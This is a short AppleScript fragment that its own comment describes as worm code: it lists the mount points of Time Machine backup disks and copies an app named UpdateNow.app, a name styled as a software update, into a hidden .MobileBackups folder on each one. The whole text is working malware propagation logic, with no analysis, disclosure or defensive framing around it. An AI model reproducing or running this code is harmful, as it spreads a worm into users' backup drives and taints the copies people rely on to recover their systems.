-- Scans for Time Machine backup disks and copies worm into them

set tmDrives to do shell script "tmutil destinationinfo | grep 'Mount Point' | awk '{print $3}'"

repeat with d in paragraphs of tmDrives
	-- Try copying to root or Application folder of backup drive
	do shell script "cp -R /Users/Shared/UpdateNow.app " & d & "/.MobileBackups/Applications/"
end repeat
